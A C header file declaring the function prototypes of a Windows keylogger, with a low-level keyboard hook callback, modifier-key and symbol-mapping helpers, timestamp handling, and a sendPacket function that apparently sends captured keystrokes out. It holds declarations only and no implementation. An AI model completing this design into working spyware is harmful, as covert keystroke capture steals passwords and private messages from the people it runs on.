#ifndef KEYLOGGER_KEYLOGGER_H
#define KEYLOGGER_KEYLOGGER_H

#include <windows.h>
#include <stdbool.h>
#include <stdint.h>

void getTimestamp(char* str);
bool CAPSLOCK();
bool SHIFT();
bool ALT();
bool CTRL();
bool CTRL_ALT();
int numKeySymbol(const char symbols[3]);
int misc2KeySymbol(const char symbols[2]);
int misc3KeySymbol(const char symbols[3]);
void sendPacket(char* body);
void handleTimestamp(uint32_t ksTime, char* body);
int getSymbol(int vkCode);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

#endif //KEYLOGGER_KEYLOGGER_H
